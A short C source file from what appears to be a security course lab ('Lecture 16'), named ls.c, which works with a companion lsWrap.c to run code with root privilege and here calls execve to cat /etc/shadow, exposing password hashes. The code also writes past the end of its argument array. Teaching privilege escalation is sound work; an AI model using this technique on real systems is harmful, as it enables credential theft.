#include <string.h>
#include <fcntl.h>      // file handling
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>     // execve

/* Lecture 16: Lab Exercise
   Program: ls.c

   This program works in conjunction with lsWrap.c to execute arbitrary
   code with root privilege. See the comments in lsWrap.c.
*/

int main(int argc, char **argv)
{
    char *v[2];     // array of pointers
    
    v[0] = "/bin/cat";
    v[1] = "/etc/shadow";
    v[2] = '\0';

    execve("/bin/cat", v, '\0');

    return 0;
}

